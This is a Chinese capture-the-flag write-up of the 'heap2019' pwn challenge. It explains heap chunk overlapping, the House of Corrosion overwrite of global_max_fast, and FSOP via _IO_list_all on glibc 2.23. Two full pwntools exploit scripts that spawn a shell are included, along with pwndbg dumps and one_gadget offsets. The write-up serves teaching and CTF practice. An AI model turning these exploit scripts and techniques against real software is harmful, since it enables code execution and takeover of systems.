---
title: 铁人三项heap2019
date: 2023-01-10 18:50:21
tags:
- pwn
- heap
- house_of_xxx
categories: 
- pwn_wp

---

第四届“长城杯”信息安全铁人三项赛初赛的唯一一题pwn，做的时候没想到0xdeadbeef写在哪，有点难蚌。

<!--more-->

保护全开，先逆向看下。

64位菜单堆题，libc-2.23，没有show，edit也不能edit chunk，不过可以写bss段上的一点东西，可以轻易得到一个任意地址写`0xdeadbeef`；alloc 限制了 size > 0x90 && size <= 0x2333，申请不到`fast bin chunk`，不过使用的是`malloc`，没有对申请的内存进行清理；free没有问题。

![img](./%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9heap2019/1673449093269-1.png)

利用的是House of Corrosion，将0xdeadbeef调整偏移写到`global_max_fast`。`global_max_fast`是一个libc中的全局变量，表示最大的fastbin chunk的大小，默认为`0x80`，在没有初始化堆的情况下为`0`。

改写`globla_max_fast`可以让程序将更大的chunk视作fast bin chunk，在malloc和free的时候将作为fast bin chunk处理。`fastbinsY`中有10个元素，存放大小从`0x20~0xb0`的chunk，当超出该范围的chunk进入`fastbinsY`时，就会发生**数组越界**。利用此方法我们可以向`fastbinsY`后面的内存中写入一个堆地址（通过free），也可以取出后面内存中指针指向的chunk（如果可以malloc该size的话）。

偏移和要处理的`chunk size`可以用此式子计算：`chunk size = (address-fastbinsY)* 2 + 0x20`（这个size包括了`header`），其中`chunk size`是处理的`chunk`的`size`，`address`是会写入或`malloc`的地址，`fastbinsY`为`fastbinsY`的地址。

一开始打算将`globla_max_fast`写为`0xdead`，通过free直接将堆地址写入`_IO_list_all`打FSOP，结果free后的chunk中只有`fd`字段有内容，其余部分的内容都被清空了。这是fast bin特有的吗？unsorted bin好像不会，之前没太注意。

后面参考了下main的思路，也有了些想法。

1. main的思路：`leak -> 利用任意地址0xde构造overlapping -> 利用任意地址写0xde增大global_max_fast -> 利用overlapping修改fast bin chunk的fd配合任意地址写0xde实现任意地址分配 -> 分配到__malloc_hook附近修改__malloc_hook`。

2. 同main的思路，但是打`IO`：`leak -> 利用任意地址0xde构造overlapping -> 利用任意地址写0xde增大global_max_fast -> 利用overlapping修改fast bin chunk的fd配合任意地址写0xde实现任意地址分配 -> 分配到_IO_list_all/vtable附近伪造IO_FILE/vtable -> 走exit到_IO_OVERFLOW`（未尝试过）。

3. 借鉴main的思路，利用`House of Corrosion`打`IO`：`leak -> 利用任意地址0xde构造overlapping -> 利用任意地址写0xdead增大global_max_fast -> 利用House of Corrosion劫持_IO_list_all -> 利用overlapping伪造IO_FILE -> 走exit到_IO_OVERFLOW`。

下面先按照3的思路写：

## leak 

这题泄露地址挺简单的，输入`2019`就会返回`bss`中的`heap_list`，借此可以泄露出程序基地址。

libc和heap地址泄露也不难，程序中`malloc`时不会清理原有数据，因此可以借助`unsorted bin chunk的fd和bk`泄露libcbase和heapbase。

## overlapping

首先利用任意地址写`0xdeadbeef`修改`size`来构造overlapping，这波遇到了之前没有遇到的问题，也算是有些收获。

ptmalloc**完全依靠`chunk`的`prev_size`和`size`两个字段来判断chunk的使用情况和对chunk的前后块进行定位**，即使`prev_size`和`size`是有问题的，只要能通过检查就能正常执行。

在这道题中就是如此，利用任意地址写`0xdeadbeef`可以伪造`chunk`的`size`为`0xde`，这个`size`在64位系统下是不正常的，因为64位系统下的`size`是`0x10`对齐的，正常情况下不会出现这样`size`的`chunk`，这个`size`的`chunk`也无法被申请或切割得到，但是在本次利用中，并没有针对对齐的检查，这个`size`的`chunk`是可以使用的（除了不能直接malloc）。

那要如何利用任意地址写`0xdeadbeef`修改`size`来构造overlapping呢？**关键在于伪造`chunk`前后的`prev_size`和`size`**。ptmalloc定位`next chunk`的方法是`chunk + (size - flags)`，通过此式子在对应的位置写入合理的`prev_size`和`size`，保证`size==next_chunk->prev_size`和`chunk+size==next_chunk`

本题中通过修改`free`后`chunk`的`size`为`0xde`实现初步的overlapping，但这是不够的。由于这个`size`的特殊性，                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        不能直接申请出来，因此只能通过切割来获取能申请出来的`chunk`，而这个`chunk`最大也只有`0xb0`的大小（`last_remainder>=MIN_SIZE`才会切割），但就算这个`chunk`原来申请时申请最小的大小，`size`也要到`0xa0`（`malloc(0x98)`的情况下），最多只能控制到正常情况下下一个`chunk`的`fd`和`bk`，对于伪造`IO_FILE`是不够的（调试的时候看到即使是打`__malloc_hook`也不够）

```sh
pwndbg> x/40gx 0x55bf8d2d10a0
0x55bf8d2d10a0:	0xadbeef00000000a0	0x00000000000000de <- 伪造 id==1的chunk的size，原本为0xa1
0x55bf8d2d10b0:	0x00007fd3f3138b78	0x00007fd3f3138b78
0x55bf8d2d10c0:	0x6262626262626262	0x6262626262626262
0x55bf8d2d10d0:	0x6262626262626262	0x6262626262626262
0x55bf8d2d10e0:	0x6262626262626262	0x6262626262626262
0x55bf8d2d10f0:	0x6262626262626262	0x6262626262626262
0x55bf8d2d1100:	0x6262626262626262	0x6262626262626262
0x55bf8d2d1110:	0x6262626262626262	0x6262626262626262
0x55bf8d2d1120:	0x6262626262626262	0x6262626262626262
0x55bf8d2d1130:	0x6262626262626262	0x6262626262626262
0x55bf8d2d1140:	0x00000000000000a0	0x00000000000000a0 <- id==2
0x55bf8d2d1150:	0x6363636363636363	0x6363636363636363 <- 修改 size==de后可以堆叠到这里
0x55bf8d2d1160:	0x6363636363636363	0x6363636363636363
0x55bf8d2d1170:	0x6363636363636363	0x00000000000000d8
0x55bf8d2d1180:	0x0000000000000061	0x6363636363636363
0x55bf8d2d1190:	0x6363636363636363	0x6363636363636363
0x55bf8d2d11a0:	0x6363636363636363	0x6363636363636363
0x55bf8d2d11b0:	0x6363636363636363	0x6363636363636363
0x55bf8d2d11c0:	0x6363636363636363	0x6363636363636363
0x55bf8d2d11d0:	0x6363636363636363	0x6363636363636363
pwndbg> x/10gx 0x55bf8bcdd040
0x55bf8bcdd040:	0x000055bf8d2d1010	0x0000000000000000 <- heap_list
0x55bf8bcdd050:	0x000055bf8d2d1150	0x000055bf8d2d11f0
0x55bf8bcdd060:	0x000055bf8d2d2600	0x0000000000000000
```

因此，我们要借助这个初步的overlapping得到更大范围的overlapping。由于我们可以控制到正常情况下，下一个`chunk`的`fd`和`bk`，那我们自然也可以控制其`prev_size`和`size`来再次实现overlapping，并且这次构造的`prev_size`和`size`的值可以由我们自行控制，我们甚至可以构造一个完整包含下一（几）个`chunk`的`size`，不过注意要在对应地方伪造`next_chunk->prev_size`。

```sh
pwndbg> x/30gx 0x563da84b90a0
0x563da84b90a0:	0xadbeef00000000a0	0x00000000000000b1 <- id==1
0x563da84b90b0:	0x4141414141414141	0x4141414141414141
0x563da84b90c0:	0x4141414141414141	0x4141414141414141
0x563da84b90d0:	0x4141414141414141	0x4141414141414141
0x563da84b90e0:	0x4141414141414141	0x4141414141414141
0x563da84b90f0:	0x4141414141414141	0x4141414141414141
0x563da84b9100:	0x4141414141414141	0x4141414141414141
0x563da84b9110:	0x4141414141414141	0x4141414141414141
0x563da84b9120:	0x4141414141414141	0x4141414141414141
0x563da84b9130:	0x4141414141414141	0x4141414141414141
0x563da84b9140:	0x0000000000000000	0x00000000000014b1 <- 伪造 id==2的chunk的size，原本为0xa0
0x563da84b9150:	0x6363636363636363	0x0000000000000029 <- 切割后chunk的位置
0x563da84b9160:	0x00007f50b666db78	0x00007f50b666db78
0x563da84b9170:	0x6363636363636363	0x0000000000000028
0x563da84b9180:	0x0000000000000061	0x6363636363636363
0x563da84b9190:	0x6363636363636363	0x6363636363636363
0x563da84b91a0:	0x6363636363636363	0x6363636363636363
0x563da84b91b0:	0x6363636363636363	0x6363636363636363
0x563da84b91c0:	0x6363636363636363	0x6363636363636363
0x563da84b91d0:	0x6363636363636363	0x6363636363636363
0x563da84b91e0:	0x00000000000000a0	0x0000000000001411  <- id==1
0x563da84b91f0:	0x6464646464646464	0x6464646464646464
0x563da84b9200:	0x6464646464646464	0x6464646464646464
pwndbg> x/10gx 0x563da7d62040
0x563da7d62040:	0x0000563da84b9010	0x0000563da84b90b0 <- heap_list
0x563da7d62050:	0x0000563da84b9150	0x0000563da84b91f0
0x563da7d62060:	0x0000563da84ba600	0x0000000000000000
```

这里我选择的是构造完整包含下一个`chunk`的`size`，至此我们构造的overlapping已经足够了。

## House of Corrision

`House of Corrosion`是一个很早的利用，**通过改写全局变量`global_max_fast`来扩大fast bin chunk的大小范围，以此来实现对fastbinsY的数组越界利用**，可以做到越界申请内存或写入一个堆地址。

偏移和要处理的`chunk size`可以用此式子计算：`chunk size = (address-fastbinsY)* 2 + 0x20`（这个size包括了`header`），其中`chunk size`是处理的`chunk`的`size`，`address`是会写入或`malloc`的地址，`fastbinsY`为`fastbinsY`的地址。

此处利用任意地址写`0xdead`来修改`global_max_fast`的大小，之后利用`free`将一个堆地址写到`_IO_list_all`来劫持`IO`流。被写的这个堆地址指向的`chunk`就是之前overlapping构造好的`chunk`，因此`size`需要提前计算好并设置。

## FSOP

劫持`_IO_list_all`后就可以伪造一个`IO_FILE`结构体，并伪造其`vtable`（glibc-2.23没有对`vtable`的合法性检查），程序里面有`exit`的功能，会调用`exit()`，因此这里选择的是走`exit() -> ... ->  _IO_flush_all_lockp() -> _IO_OVERFLOW`的链。

为此伪造的IO_FILE需要满足以下条件：

1. `fp->_mode<=0`
2. `fp->_IO_write_ptr > fp->_IO_write_base`

伪造`_flags="/bin/sh\x00"`，`vtable`中的`_IO_OVERFLOW=system`，当调用`exit()`时就会一路调用到`system("/bin/sh\x00")`。

伪造的`IO`如下：

```py
# construct fake io
payload=p64(0)*3+p64(sys_addr)+'a'*0x70
fake_io="/bin/sh\x00"+p64(0x1411)
fake_io+=p64(0)*3+p64(1)+p64(0)
fake_io=fake_io.ljust(0xd8,'\x00')
fake_io+=p64(heapbase+0x150) # vtable
payload+=fake_io
```

## exp

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn'
elf=ELF('./'+filename)
libc=ELF('./2.23-0ubuntu11.3_amd64/libc-2.23.so')
p=process('./'+filename)
#p=remote('',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()


def add(length,content):
  ru("4.exit\n")
  sl("1")
  ru("Content length:\n")
  sl(str(length))
  ru("Content:")
  s(str(content))

def delete(id):
  ru("4.exit\n")
  sl("3")
  ru("Content id:\n")
  sl(str(id))

def edit(addr):
  ru("4.exit\n")
  sl("2")
  ru("Comment:\n")
  s(addr)

def get_heap_addr():
  ru("4.exit\n")
  sl("2019")
  heap_list=ru("\n")
  heap_list=int(heap_list[2:],16)
  return heap_list

heap_list=get_heap_addr()
elfbase=heap_list-0x202040

add(0x98,'a'*0x98) # 0
add(0x98,'b'*0x98) # 1
delete(0)
add(0x98,"aaaaaaaa") # 0
ru("aaaaaaaa")
libcbase=uu64(ru("\x7f"))-3951480 

add(0x98,'c'*0x98) # 2
add(0x98,'d'*0x98) # 3
add(0x98,'f'*0x98) # 4
delete(0)
delete(2)

add(0x98,'aaaaaaaa') # 0
ru("aaaaaaaa")
heapbase=uu64(ru('\n')[:-1])-0x140

global_max_fast=libcbase+0x3c67f8
_IO_list_all=libcbase+libc.sym['_IO_list_all']
fastbinsY=libcbase+libc.sym['__malloc_hook']+0x10+0x8
chunk_size=(_IO_list_all-fastbinsY)*2+0x20-0x10
sys_addr=libcbase+libc.sym['system']

# construct fake prev_size and size to bypass unlink when add
payload='c' * 0x28 + p64(0xd8) + p64(0x61)
add(0x98,payload) # 2

# update the size
delete(4)
delete(3)
add(chunk_size,'d'*0x98) # 3
add(0x98,'f'*0x98) # 4

# delete 1 and overwrite its size to 0xde
delete(1)
payload='a'*0x20+p64(heapbase+0xa8-0x3)
edit(payload)

payload='A'*0x90+p64(0)+p64(chunk_size+0x10+0xa1)
add(0xa8,payload) # 1

# 5 will not exist, put all free chunk to small bin to prevent unexpected error
ru("4.exit\n")
sl("1")
ru("Content length:\n")
sl(str(0x100))

delete(2)

payload='g'*0x90+p64(0)+p64(chunk_size+0x11)

add(0x14a0,payload) # 2

# write global_max_fast to 0xdead
payload='a'*0x20+p64(global_max_fast-0x2)
edit(payload)

# House of corrosion
# hijack _IO_list_all
delete(3)

delete(2)
# construct fake io
payload=p64(0)*3+p64(sys_addr)+'a'*0x70
fake_io="/bin/sh\x00"+p64(0x1411)
fake_io+=p64(0)*3+p64(1)+p64(0)
fake_io=fake_io.ljust(0xd8,'\x00')
fake_io+=p64(heapbase+0x150) # vtable
payload+=fake_io
# overwrite 3
add(0x14b0-0x10,payload) # 2


leak("heap_list",hex(heap_list))
leak("elfbase",hex(elfbase))
leak("libcbase",hex(libcbase))
leak("heapbase",hex(heapbase))
leak("global_max_fast",hex(global_max_fast))
leak("_IO_list_all",hex(_IO_list_all))
leak("fastbinsY",hex(fastbinsY))
leak("chunk_size",hex(chunk_size))
leak("sys_addr",hex(sys_addr))
# debug()

# trigger
ru("4.exit\n")
sl("4")

itr()
```

## 其他思路

如果按照main的思路走的话，一直到overlapping都是一样的，但overlapping的`chunk`的`size`有所不同，这里需要另其为`0xd0`，这样才能通过任意地址写`0xde`来伪造`size`。

首先需要利用任意地址写`0xde`修改`global_max_fast`，让`0xd0`大小的`chunk`都能被认为是`fast bin chunk`，之后将overlapping的大小为`0xd0`的`chunk`释放到越界的`fast bin`中。

打`__malloc_hook`的话，由于只能任意地址写`0xde`来伪造`size`，需要在`__malloc_hook`前面找一段`0x0000000000000000`的空间来伪造`size`。

伪造好后利用overlapping修改`0xd0`大小的`fast bin`中`chunk`的`fd==fake_chunk`，之后申请两次即可得到`__malloc_hook`处的内存，修改其为`one_gadget`即可`get shell`。

exp:

```py
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
       
mode = 1
if mode == 1:
    fang = process("./heap2019")  
else:
    fang = remote("node4.buuoj.cn",28812)

def debug():
    gdb.attach(fang)
    pause()

def alloc2(size):
    fang.recvuntil("4.exit\n")
    fang.sendline(str(1))
    fang.recvuntil("Content length:\n")
    fang.sendline(str(size))

def alloc(size,cont):
    fang.recvuntil("4.exit\n")
    fang.sendline(str(1))
    fang.recvuntil("Content length:\n")
    fang.sendline(str(size))
    fang.recvuntil("Content:\n")
    fang.send(cont)

def dele(idx):
    fang.recvuntil("4.exit\n")
    fang.sendline(str(3))
    fang.recvuntil("Content id:\n")
    fang.sendline(str(idx))

def edit(cont):
    fang.recvuntil("4.exit\n")
    fang.sendline(str(2))
    fang.recvuntil("Comment:\n")
    fang.send(cont)

# libc = ELF("./libc-2.23.so")
libc = ELF("/home/functionmain/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")

# gdb.attach(fang,'b *(0x555555400000 + 0xc1d)')
# pause()

fang.recvuntil("4.exit\n")
fang.sendline(str(2019))
fang.recvuntil("0x")
elf_base = int(fang.recv(12),16) - 0x202040


alloc(0x98,b'a' * 0x98) # 0

payload = b'a' * 0x98
alloc(0x98,payload) # 1

alloc(0x98,payload) # 2

pd = b'b' * 0x98
alloc(0x98,pd) # 3

pd = b'A' * 0x20 + p64(0) + p64(0x71)
alloc(0x98,pd) # 4

dele(0)
alloc(0x98,b'a') # 0
fang.recvuntil("Data is:\n")
libc_base = u64(fang.recv(6).ljust(8,b'\x00')) - 0x3c4b61
one_gadget4 = [0x45226,0x4527a,0xf03a4,0xf1247]
one_gadget_addr = libc_base + one_gadget4[3]

dele(0)
dele(2)
alloc(0x98,b'aaaaaaaa') # 0
fang.recvuntil("aaaaaaaa")
heap_base = u64(fang.recv(6).ljust(8,b'\x00')) - 0x140

# 是0x28且size是0xd8是因为前一个chunk的size被修改为0xde，除去标志位的size就是0xd8，而寻找下一个chunk是依靠size的大小的
# 因此会认为chunk_addr+size，所以会找到0xd8的位置，并认为他是prev_size
# 正常情况下size都是0x10对齐的(64bit下)，但这里不是，所以会出现这样的情况
payload = b'b' * 0x28 + p64(0xd8) + p64(0x61)
alloc(0x98,payload) # 2

dele(1)
payload = b'a' * 0x20 + p64(heap_base + 0xa8 - 3)
edit(payload)

# 余下的要大于MIN_SIZE才会切割，顺便改写id==2的size
payload = b"A" * 0x90 + p64(0) + p64(0x141)
alloc(0xa8,payload) # 1

alloc2(0x98) # 5 马上free的，只是把unsorted剩下的赶进去small bin

# 放进 unsorted bin
dele(2)

payload = b'a' * 0x90 + p64(0) + p64(0xd1)
alloc(0x130,payload) # 2

dele(2)

# 修改 global_max_fast
payload = b'a' * 0x20 + p64(libc_base + 0x3c67f8 - 3)
edit(payload)

# 进入 fastbinsY，越界写到了last_remainder
dele(3)

# 在__malloc_hook前伪造size
payload = b'a' * 0x20 + p64(libc_base + libc.symbols['__malloc_hook'] - 0x30 + 8 - 3)
edit(payload)

# 覆写fd指向fake chunk(__malloc_hook前)
payload = b'a' * 0x90 + p64(0) + p64(0xd1) + p64(libc_base + libc.symbols['__malloc_hook'] - 0x30 )
alloc(0x130,payload) # 2

alloc(0xc0,'BBBB') # 3

dele(0)

# 分配并修改malloc
payload = b'A' * 0x18 + p64(one_gadget_addr) + p64(libc_base + libc.symbols["realloc"])
alloc(0xc0,payload) # 0

# gdb.attach(fang,'b *(0x555555400000 + 0xAC9)')
# pause()
alloc2(0x100)

log.info("elf_base : 0x%x" % elf_base)
log.info("libc_base : 0x%x" % libc_base)
log.info("heap_base : 0x%x" % heap_base)
# debug()

fang.interactive()
"""
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

"""
```

